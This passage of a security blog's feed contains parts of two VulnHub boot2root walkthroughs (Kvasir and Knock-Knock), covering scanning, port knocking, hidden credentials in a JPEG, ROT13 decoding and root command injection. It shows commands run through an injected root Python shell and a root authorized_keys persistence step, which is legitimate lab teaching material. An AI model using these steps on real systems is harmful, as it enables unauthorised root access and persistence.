(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress
=============================
Can you retrieve my secret..?
=============================

Usage:
&#39;V&#39; to view the encrypted flag
&#39;E&#39; to encrypt a plaintext string (e.g. &#39;E AAAA&#39;)

0W6U6vwG4W1V
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Wut. Ok, so I have a &lt;em&gt;thing&lt;/em&gt; now. It didn’t accept anything I was typing into it. Everything just came back with another &lt;code&gt;&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;gt; ls
&amp;gt; id
&amp;gt; whoami
&amp;gt; ls -lah
&amp;gt; uname -a
&amp;gt; help
&amp;gt; ?
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I disconnected from the netcat session and tabbed back to the session where the &lt;code&gt;/opt/wep2.py&lt;/code&gt; script is started. Immediately it became clear what was going on:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kefka@adm:~$ sudo /opt/wep2.py
Traceback (most recent call last):
  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
NameError: name &#39;ls&#39; is not defined
Traceback (most recent call last):
  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
NameError: name &#39;whoami&#39; is not defined
Traceback (most recent call last):
  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
NameError: name &#39;ls&#39; is not defined
Traceback (most recent call last):
  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
NameError: name &#39;uname&#39; is not defined
  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1
    ?
    ^
SyntaxError: invalid syntax
Traceback (most recent call last):
  File &amp;quot;/opt/wep2.py&amp;quot;, line 94, in &amp;lt;module&amp;gt;
    handler(sock, addr)
  File &amp;quot;/opt/wep2.py&amp;quot;, line 74, in handler
    sock.send(p1)
socket.error: [Errno 32] Broken pipe
kefka@adm:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It seems like I have a kind of python shell? After a bit of fiddling around, I eventually started getting something usefull out of it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;0W6U6vwG4W1V
&amp;gt; import os; os.system(&#39;id&#39;);
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay :) I went straight for the &lt;code&gt;cat /root/flag&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;gt; import os; os.system(&#39;cat /root/flag&#39;);
    _  __                             _
   | |/ /   __ __   __ _     ___     (_)      _ _
   | &#39; &amp;lt;    \ I /  / _` |   (_-&amp;lt;     | |     | &#39;_|
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_
  _|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|
  &amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;

Pbatenghyngvbaf ba orngvat Xinfve - V ubcr lbh rawblrq
gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax
gur Zrnq bs Cbrgel...

Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.

Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
uggc://jv-sh.pb.hx, #IhyaUho VEP be Gjvggre.

  enfgn_zbhfr(@_EnfgnZbhfr)
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Err, oh &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; you!! What is this? I figured I need to get a proper shell going to make life a little easier for myself. I did this by using the command execution we have now to prepare a authorized_keys file for root for me, adding the public key of the key pair I initially created. Then, finally, I SSH&amp;rsquo;d in as root:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ssh root@127.0.0.1 -i kvasir_key
ProxyChains-3.1 (http://proxychains.sf.net)
Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 16:57:16 2014 from localhost
root@adm:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-final-troll&#34;&gt;the final troll&lt;/h2&gt;

&lt;p&gt;With the &lt;code&gt;/root/flag&lt;/code&gt; in a really strange format, I poked around a little to see what is going on. Eventually I went down to a python shell, loaded the flag and fiddled with &lt;code&gt;decode()&lt;/code&gt; again:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@adm:~# python
Python 2.7.3 (default, Mar 13 2014, 11:03:55)
[GCC 4.7.2] on linux2
Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information.
&amp;gt;&amp;gt;&amp;gt; with open(&#39;/root/flag&#39;) as f:
...     flag = f.read()
...
&amp;gt;&amp;gt;&amp;gt; print flag.decode(&#39;rot13&#39;)
    _  __                             _
   | |/ /   __ __   __ _     ___     (_)      _ _
   | &#39; &amp;lt;    \ V /  / _` |   (_-&amp;lt;     | |     | &#39;_|
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_
  _|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|
  &amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;

Congratulations on beating Kvasir - I hope you enjoyed
the ride.  Take his blood, mix with honey and drink
the Mead of Poetry...

Big shout out to my beta testers: @barrebas and @TheColonial.
Special thanks to Bas for his patience during this endeavour.

Feel free to ping me with thoughts/comments on
http://wi-fu.co.uk, #VulnHub IRC or Twitter.

  rasta_mouse(@_RastaMouse)

&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;Wow. I actually can&amp;rsquo;t describe how tired I am now haha. From both doing Kvasir and taking almost a full day for this writeup :D However, this is most definitely one of my most favorite boot2roots out there thus far!&lt;/p&gt;

&lt;p&gt;Many many thanks to &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; for putting together this polished piece of work and &lt;a href=&#34;https://twitter.com/VulHub&#34;&gt;@VulnHub&lt;/a&gt; for the hosting!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>knock-knock who’s there? solving knock knock</title>
      <link>https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/</link>
      <pubDate>Tue, 14 Oct 2014 09:14:26 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://vulnhub.com/series/knock-knock,53/&#34;&gt;Knock-Knock&lt;/a&gt; is a vulnerable boot2root VM by &lt;a href=&#34;https://twitter.com/zer0w1re&#34;&gt;@zer0w1re&lt;/a&gt; and sure as heck was packed with interesting twists and things to learn!&lt;/p&gt;

&lt;p&gt;I figured I&amp;rsquo;d just &lt;em&gt;have a quick look™&lt;/em&gt;, and midnight that evening ended up with &lt;em&gt;root&lt;/em&gt; privileges :D&lt;/p&gt;

&lt;p&gt;As always, if you have not done this VM yet, this post is a massive spoiler and I would highly recommend you close up here and try it first :)
This is my experience &amp;lsquo;knocking&amp;rsquo; on the door.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;“Theodore!”&lt;/p&gt;

&lt;p&gt;“Theodore who?”&lt;/p&gt;

&lt;p&gt;“Theodore wasn&amp;rsquo;t open so I knocked”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;getting-started&#34;&gt;getting started&lt;/h2&gt;

&lt;p&gt;As always, the vm&amp;rsquo;s files were downloaded and imported into VirtualBox. I fired up the vm and watched &lt;code&gt;arp&lt;/code&gt; for any new entries. This presented the first hurdle. A ping scan showed no new IP&amp;rsquo;s in the network range my VM&amp;rsquo;s were in (192.168.56.0/24):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sudo nmap -sN 192.168.56.0/24

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-14 09:51 SAST
Nmap scan report for 192.168.56.1
Host is up (0.000030s latency).
All 1000 scanned ports on 192.168.56.1 are closed (936) or open|filtered (64)

Nmap done: 256 IP addresses (1 host up) scanned in 14.99 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Only the gateway was alive. A &lt;code&gt;arp -a&lt;/code&gt; however spilled some of the beans:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ arp -i vboxnet0 -a
? (192.168.56.0) at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope [ethernet]
? (192.168.56.1) at a:0:27:0:0:0 on vboxnet0 ifscope permanent [ethernet]
? (192.168.56.2) at (incomplete) on vboxnet0 ifscope [ethernet]

[... snip ...]

? (192.168.56.201) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.202) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.203) at 8:0:27:be:dd:c8 on vboxnet0 ifscope [ethernet]
? (192.168.56.204) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.205) at (incomplete) on vboxnet0 ifscope [ethernet]

[... snip ...]

? (192.168.56.255) at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope [ethernet]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hello &lt;code&gt;.203&lt;/code&gt;! Pinging 192.168.56.203 responded with Destination Port Unreachable messages:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ping -c 2 192.168.56.203
PING 192.168.56.203 (192.168.56.203) 56(84) bytes of data.
From 192.168.56.203 icmp_seq=1 Destination Port Unreachable
From 192.168.56.203 icmp_seq=2 Destination Port Unreachable

--- 192.168.56.203 ping statistics ---
2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 999ms
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While a little confusing at first, I figured the firewall was to blame here. I proceeded to focus my attention on this IP and did a normal &lt;code&gt;nmap&lt;/code&gt; scan:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap -sV --reason 192.168.56.203 -p-

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 10:03 SAST
Nmap scan report for 192.168.56.203
Host is up, received reset (0.0016s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT     STATE SERVICE REASON  VERSION
1337/tcp open  waste?  syn-ack

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port1337-TCP:V=6.46%I=7%D=10/14%Time=543CEE50%P=i686-pc-linux-gnu%r(NUL
SF:L,15,&amp;quot;\[12247,\x202759,\x2026802\]\n&amp;quot;)%r(GenericLines,15,&amp;quot;\[37866,\x202
SF:9242,\x203904\]\n&amp;quot;)%r(GetRequest,15,&amp;quot;\[29185,\x207368,\x2028937\]\n&amp;quot;)%r
SF:(HTTPOptions,15,&amp;quot;\[55772,\x205315,\x2050180\]\n&amp;quot;)%r(RTSPRequest,13,&amp;quot;\[9
SF:301,\x2026341,\x20574\]\n&amp;quot;)%r(RPCCheck,16,&amp;quot;\[34002,\x2046353,\x2023995\
SF:]\n&amp;quot;)%r(DNSVersionBindReq,16,&amp;quot;\[47043,\x2037532,\x2024012\]\n&amp;quot;)%r(DNSSt
SF:atusRequest,15,&amp;quot;\[31914,\x208919,\x2027965\]\n&amp;quot;)%r(Help,15,&amp;quot;\[63865,\x2
SF:07077,\x2055801\]\n&amp;quot;)%r(SSLSessionReq,15,&amp;quot;\[30406,\x208520,\x2047713\]\
SF:n&amp;quot;)%r(Kerberos,16,&amp;quot;\[10459,\x2050977,\x2063996\]\n&amp;quot;)%r(SMBProgNeg,16,&amp;quot;\
SF:[61080,\x2038407,\x2048416\]\n&amp;quot;)%r(X11Probe,15,&amp;quot;\[61127,\x2058212,\x203
SF:856\]\n&amp;quot;)%r(FourOhFourRequest,16,&amp;quot;\[11007,\x2051452,\x2038765\]\n&amp;quot;)%r(L
SF:PDString,15,&amp;quot;\[5738,\x2063719,\x2026394\]\n&amp;quot;)%r(LDAPBindReq,14,&amp;quot;\[14292
SF:,\x20937,\x2020668\]\n&amp;quot;)%r(SIPOptions,16,&amp;quot;\[33684,\x2058491,\x2031373\]
SF:\n&amp;quot;)%r(LANDesk-RC,16,&amp;quot;\[58946,\x2030941,\x2053345\]\n&amp;quot;)%r(TerminalServe
SF:r,15,&amp;quot;\[6672,\x2031370,\x2053882\]\n&amp;quot;)%r(NCP,16,&amp;quot;\[15356,\x2041972,\x20
SF:52087\]\n&amp;quot;)%r(NotesRPC,16,&amp;quot;\[51444,\x2044303,\x2013901\]\n&amp;quot;)%r(WMSReque
SF:st,13,&amp;quot;\[87,\x2044952,\x2060309\]\n&amp;quot;)%r(oracle-tns,15,&amp;quot;\[51073,\x204686
SF:0,\x206777\]\n&amp;quot;)%r(afp,16,&amp;quot;\[30287,\x2064026,\x2029364\]\n&amp;quot;)%r(kumo-ser
SF:ver,14,&amp;quot;\[17824,\x2048485,\x20579\]\n&amp;quot;);

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5521.11 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;knock-knock&#34;&gt;knock knock&amp;hellip;&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;tcp/1337&lt;/code&gt; was the only open port on the machine. I promptly connected to it to see what we have:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nc -vn 192.168.56.203 1337
(UNKNOWN) [192.168.56.203] 1337 (?) open
[6605, 29872, 38566]

root@kali:~# nc -vn 192.168.56.203 1337
(UNKNOWN) [192.168.56.203] 1337 (?) open
[43059, 22435, 17432]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Interesting. Each connection returns a list of numbers. At this stage I should mention that the name of the VM, together with the list of 3 numbers (which look like port numbers as they are always below 65535) had me think that this had to be the sequence in which we have to knock ports to open others.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://en.wikipedia.org/wiki/Port_knocking&#34;&gt;Port knocking&lt;/a&gt; generally means that we send a sequence of packets on specific ports so that the listener may perform a certain action when the correct sequence has been &amp;lsquo;knocked&amp;rsquo;. Think of it literally as if someone knocks 3 times at your door and you open up. The only thing is the 3 knocks have to be in a specific order, and if they are not, you will generally ignore the person at the door. It&amp;rsquo;s also important to note that you will also not react to say a single knock. Only those 3 specific ones.&lt;/p&gt;

&lt;p&gt;There are plenty of implementations of port knocking out there. My personal favorite being &lt;a href=&#34;http://www.thoughtcrime.org/software/knockknock/&#34;&gt;knock-knock&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/moxie&#34;&gt;@moxie&lt;/a&gt;. I have previously played with this implementation and its pretty sweet. A crypted packet is sent to a machine that is logging firewall drops. &lt;a href=&#34;http://www.thoughtcrime.org/software/knockknock/&#34;&gt;knock-knock&lt;/a&gt; tails the &lt;code&gt;kern.log&lt;/code&gt; and reacts on the correct sequences.&lt;/p&gt;

&lt;p&gt;This VM did not give any hints on secrets, so I figured that the implementation is probably not this one. But which one is it? Hard to say at this stage.&lt;/p&gt;

&lt;h2 id=&#34;whos-there&#34;&gt;&amp;hellip;whos there?&lt;/h2&gt;

&lt;p&gt;So with the &lt;code&gt;tcp/1337&lt;/code&gt; service telling us a sequence, I set out to test this knocking theory. The first attempt was simply a loop over the ports, using &lt;code&gt;nmap&lt;/code&gt; to scan them:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
43059/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
22435/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
17432/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With that done, I rescanned the box for any new open ports but nothing was different. I retried the &lt;code&gt;nmap&lt;/code&gt; loop just to make sure, but it did not appear to make a difference.&lt;/p&gt;

&lt;p&gt;Remembering that the sequence changed every time you connected to the &lt;code&gt;tcp/1337&lt;/code&gt; service, I figured it may change some configuration on the server to accept a new sequence. So, I re-connected to the &lt;code&gt;tcp/1337&lt;/code&gt; service, and looped over the new sequence. Still, nothing. At this stage a was starting to feel relatively lost as to what may be happening. I returned to doing some research on some implementations of this knock knock concept and came across &lt;a href=&#34;https://github.com/jvinet/knock&#34;&gt;knockd&lt;/a&gt;. I downloaded the &lt;a href=&#34;https://github.com/jvinet/knock/blob/master/src/knock.c&#34;&gt;client&lt;/a&gt; and compiled locally with &lt;code&gt;gcc knock.c -o knock&lt;/code&gt; and tested to see if this makes any difference.&lt;/p&gt;

&lt;p&gt;Still nothing. Inspecting this clients sources actually revealed nothing spectacular, and so I though my last resort will be to capture some traffic via wireshark and see if I can figure out anything strange there.&lt;/p&gt;

&lt;h2 id=&#34;22-and-80-too&#34;&gt;22 and 80 too&lt;/h2&gt;

&lt;p&gt;The wireshark testing revealed nothing out of the ordinary. The traffic was behaving as expected. I continuously connected to the &lt;code&gt;tcp/1337&lt;/code&gt; service and toyed with some scapy to get different packet variations sent, followed by a full nmap. No dice. A sample scapy session was:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;gt;&amp;gt;&amp;gt; ip=IP(dst=&amp;quot;192.168.56.203&amp;quot;)
&amp;gt;&amp;gt;&amp;gt; SYN=TCP(dport=40508,flags=&amp;quot;S&amp;quot;)
&amp;gt;&amp;gt;&amp;gt; send(ip/SYN)
.
Sent 1 packets.
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After quite some time, suddenly, nmap reports &lt;code&gt;tcp/22&lt;/code&gt; and &lt;code&gt;tcp/80&lt;/code&gt; as open&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.203

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 11:40 SAST
Nmap scan report for 192.168.56.203
Host is up (0.00032s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 4.98 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;W.T.F.&lt;/strong&gt; I actually had no idea why this worked. I had some theories, but based on the amount of testing I did, I figured that I effectively brute-forced my way in.&lt;/p&gt;

&lt;p&gt;With the ports now open, I did shuffle some ideas with a few people, and it came out the the sequence may be randomized. With that in mind, I decided to slap together a python script that will try all of the possible sequences and knock all of them, hoping that one of them is eventually the correct one:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

import socket
import itertools
import sys

destination = &amp;quot;192.168.56.203&amp;quot;

def clean_up_ports(raw_string):
    &amp;quot;&amp;quot;&amp;quot; Clean up the raw string received on the socket&amp;quot;&amp;quot;&amp;quot;
    if len(raw_string) &amp;lt;= 0:
        return None

    # Remove the first [
    raw_string = raw_string.replace(&#39;[&#39;,&#39;&#39;)
    # Remove the second ]
    raw_string = raw_string.replace(&#39;]&#39;,&#39;&#39;)
    # split by commas
    first_list = raw_string.split(&#39;,&#39;)

    # start e empty return list
    ports = []
    for port in first_list:
        # strip the whitespace around the string
        # and cast to a integer
        ports.append(int(port.strip()))

    return  ports

def main():
    print &amp;quot;[+] Getting sequence&amp;quot;

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((destination, 1337))
    except Exception as e:
        print &amp;quot;[+] Unable to connect to %s on port 1337. %s&amp;quot; % (destination, e)
        sys.exit(1)

    # receive the list
    raw_list = sock.recv(20)

    # get the ports in a actual python list
    ports = clean_up_ports(raw_list)

    print &amp;quot;[+] Sequence is %s&amp;quot; % ports
    print &amp;quot;[+] Knocking on the door using all the possible combinations...\n&amp;quot;

    # Lets knock all of the possible combinations of the ports list
    for port_list in itertools.permutations(ports):

        print &amp;quot;[+] Knocking with sequence: %s&amp;quot; % (port_list,)
        for port in port_list:
            print &amp;quot;[+] Knocking on port %s:%s&amp;quot; % (destination,port)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((destination, port))
            sock.close()

        print &amp;quot;[+] Finished sequence knock\n&amp;quot;

if __name__ == &#39;__main__&#39;:
    print &amp;quot;[+] Knock knock opener&amp;quot;
    main()
    print &amp;quot;[+] Done&amp;quot;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running this opened the ports every go :)&lt;/p&gt;

&lt;p&gt;I know that I could test to see if say &lt;code&gt;tcp/22&lt;/code&gt; was open, but I went with the assumption that you don&amp;rsquo;t know what the actual ports are that should be opened, and hence the complete run of all of the permutations.&lt;/p&gt;

&lt;h2 id=&#34;may-i-burn-the-door-now&#34;&gt;may I burn the door now?&lt;/h2&gt;

&lt;p&gt;So, focus shifted to the web server at &lt;code&gt;tcp/80&lt;/code&gt;. Browsing to the web server presented us with the following:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/knock_knock_web.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Any path/file that you browse to will return this exact same picture. Sound familiar? :) This kinda breaks any form of scanning and or enumeration via things like &lt;code&gt;wfuzz&lt;/code&gt; etc. With the hint &lt;em&gt;Gotta look harder&lt;/em&gt;, I decided to move my attention to the door image itself.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wget http://192.168.56.203/knockknock.jpg
--2014-10-14 13:04:34--  http://192.168.56.203/knockknock.jpg
Connecting to 192.168.56.203:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 84741 (83K) [image/jpeg]
Saving to: `knockknock.jpg&#39;

100%[============&amp;gt;] 84,741      68.2K/s   in 1.2s

2014-10-14 13:04:35 (68.2 KB/s) - `knockknock.jpg&#39; saved [84741/84741]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I will admit that I was not very keen on the idea that something may be stego&amp;rsquo;d in the image and I was really hoping the hint would be very obvious. I opened up the image in a image viewer and zoomed in a little on the artifact I noticed at the bottom of the image. Nothing I could make real use of there.&lt;/p&gt;

&lt;p&gt;Next, I ran the image through exiftool:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/knock-knock# exiftool knockknock.jpg
ExifTool Version Number         : 8.60
File Name                       : knockknock.jpg
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2014:10:06 18:38:30+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 100
Y Resolution                    : 100
Quality                         : 74%
XMP Toolkit                     : Adobe XMP Core 4.1-c036 46.276720, Mon Feb 19 2007 22:13:43
Marked                          : © Estate of Roy Lichtenstein
Web Statement                   : © Estate of Roy Lichtenstein
Rights                          : © Estate of Roy Lichtenstein
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 650
Image Height                    : 788
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 650x788
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Roy Lichtenstein. The artist of the knock knock image?
Anyways. As you can see, nothing else that is really useful here. So the next part was to have a look at the jpeg in a raw perspective. I am no forensics expert or anything so I am pretty limited in knowledge here.&lt;/p&gt;

&lt;p&gt;My idea was to try and recover the jpeg data from &lt;code&gt;knockknock.jpg&lt;/code&gt; using &lt;code&gt;recoverjpeg&lt;/code&gt;, and then compare the resulting image with the original and check for any differences.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# extract the jpeg data
root@kali:~# recoverjpeg knockknock.jpg
Restored 1 picture

# the output image from the extract
root@kali:~# ls image00000.jpg
image00000.jpg

# the cmp
root@kali:~# cmp image00000.jpg knockknock.jpg
cmp: EOF on image00000.jpg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, the EOF differs from the 2 files. Lets check them out. First the extracted jpeg data file to see what it sais:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# tail -n 1 image00000.jpg
9��&amp;lt;V ��v�ܫQqRJ5U�&amp;lt;��W�V9`��5BV(��&amp;lt;�t�WS�����1h
                                                         ��\���z$���vB��
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As expected, junk :P Lets look at &lt;code&gt;knockknock.jpeg&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# tail -n 4 knockknock.jpg
⭚|U���b��[�k|U�������+\U����]�U¸��qW|U�]�qWX�F��*��kz����]��ѭqV�k튷�P���b��T�\+\U��Wo��9b�&amp;lt;�V��]���B��[�v*�Uثx�X�x�[����o������|U����v*�^��x��Wb�o���b��b��[����qU����צ*����*���qW�
Login Credentials
abfnW
sax2Cw9Ow
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hah! Login Credentials sound very promising!! :)&lt;/p&gt;

&lt;h2 id=&#34;ceasar-opens-the-door&#34;&gt;ceasar opens the door&lt;/h2&gt;

&lt;p&gt;After finding the hidden strings in the jpeg, I came to a quick realization that &lt;code&gt;abfnW:sax2Cw9Ow&lt;/code&gt; was not a username:password combination for the SSH service. Nor was any variations of the 2 strings.&lt;/p&gt;

&lt;p&gt;I tried to browse to the paths in the web server such as &lt;code&gt;abfnW/&lt;/code&gt; and &lt;code&gt;sax2Cw9Ow/&lt;/code&gt;, but still only got the knock knock image. With these arb strings and nothing else really to go on, I had to try get a hint on this.&lt;/p&gt;

&lt;p&gt;Turns out, the strings were encoded using a Ceasar Cipher (&lt;a href=&#34;http://en.wikipedia.org/wiki/Caesar_cipher&#34;&gt;ROT13&lt;/a&gt;). With that in mind, I took to a few python 1 liners to decode the strings. Lets start with &lt;strong&gt;abfnW&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# python -c &#39;print &amp;quot;abfnW&amp;quot;.decode(&amp;quot;rot13&amp;quot;)&#39;
nosaJ
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;abfnW decoded directly to &lt;strong&gt;nosaJ&lt;/strong&gt;. That is &lt;em&gt;Jason&lt;/em&gt; reversed. So is the username &lt;code&gt;Jason&lt;/code&gt;? Next, I tackled &lt;code&gt;sax2Cw9Ow&lt;/code&gt; in a similar fashion:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# python -c &#39;print &amp;quot;sax2Cw9Ow&amp;quot;.decode(&amp;quot;rot13&amp;quot;)&#39;
fnk2Pj9Bj
&lt;/code&gt;&lt;/pre&gt;

